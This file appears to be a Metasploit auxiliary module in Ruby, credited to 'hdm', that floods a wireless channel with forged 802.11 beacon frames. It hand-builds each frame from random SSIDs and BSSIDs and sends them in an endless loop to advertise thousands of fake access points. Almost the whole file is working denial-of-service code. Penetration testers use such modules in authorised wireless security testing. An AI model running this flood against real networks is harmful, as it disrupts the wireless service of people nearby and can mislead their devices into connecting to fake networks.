require 'msf/core'

module Msf

class Auxiliary::Dos::Wireless::APFlood < Msf::Auxiliary

	include Exploit::Lorcon


	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Wireless Fake AP Beacon Flood',
			'Description'    => %q{
				This module advertises thousands of fake access
			points, using random SIDs and BSSID addresses. Inspired
			by Black Alchemy's fakeap tool.
			},
			
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 3666 $'
		))			
	end

	def run
		open_wifi
		print_status("Sending fake beacon frames...")
		while (true)
			wifi.write(create_frame())
		end
	end
	
	def eton(addr)
		addr.split(':').map { |c| c.hex.chr }.join
	end

	def create_frame

		ssid     = Rex::Text.rand_text_alpha(rand(32)+1)
		bssid    = Rex::Text.rand_text(6)
		seq      = [rand(255)].pack('n')
		
		"\x80" +                      # type/subtype
		"\x00" +                      # flags
		"\x00\x00" +                  # duration  
		"\xff\xff\xff\xff\xff\xff" +  # dst
		bssid +                       # src
		bssid +                       # bssid
		seq   +                       # seq  
		Rex::Text.rand_text(8) +      # timestamp value
		"\x64\x00" +                  # beacon interval
		"\x00\x05" +                  # capability flags
		
		# ssid tag
		"\x00" + ssid.length.chr + ssid +
		
		# supported rates
		"\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48" +
		
		# current channel
		"\x03" + "\x01" + datastore['CHANNEL'].to_i.chr + 
		
		# traffic indication map
		"\x05" + "\x04" + "\x00\x01\x02\x20" +
		
		# country information
		"\x07" + "\x06" + "\x55\x53\x20\x01\x0b\x12" +
		
		# erp information
		"\x2a" + "\x01" + "\x00" +
		
		# extended supported rates
		"\x32" + "\x04" + "\x12\x24\x60\x6c"

	end
	
end
end	
